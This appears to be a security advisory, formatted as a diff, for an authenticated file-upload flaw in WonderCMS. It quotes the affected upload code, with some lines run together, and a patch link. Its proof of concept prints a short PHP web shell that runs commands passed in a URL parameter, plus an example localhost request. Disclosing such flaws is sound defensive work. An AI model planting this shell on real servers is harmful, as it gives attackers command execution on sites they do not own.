@@ -1,0 +1,37 @@
+Affected Code:
+
+public static function _uploadFile() { +
+- if ( ! wCMS::$loggedIn && ! isset($_FILES['uploadFile']) && ! isset($_REQUEST['token'])) return; + private static function uploadFileAction()
+- if (isset($_REQUEST['token']) && $_REQUEST['token'] == wCMS::_generateToken() && isset($_FILES['uploadFile'])) {
+
+
+Proof of Concept
+Steps to Reproduce:
+ 
+1. Login with a valid credentials
+2. Select Files option from the Settings menu of Content
+3. Upload a file with php extension containing the below code:
+ 
+           <?php
+ 
+ $cmd=$_GET['cmd'];
+ 
+ system($cmd);
+ 
+ ?>
+ 
+4. Click on Upload
+5. Once the file is uploaded Click on the uploaded file and add ?cmd= to
+the URL followed by a system command such as whoami,time,date etc.
+Example:
+http://localhost:8081/wondercms/files/shell.php?cmd=dir
+
+Recommended Patch:
+
+Create a whitelist of allowed filetypes.
+
+The patch that addresses this bug is available here:
+
+https://github.com/robiso/WonderCMS-testRepo/commit/8bd6cf9f3bf6a1d0123eb8b646584a63ee323c8a?diff=split
+
+At line 742
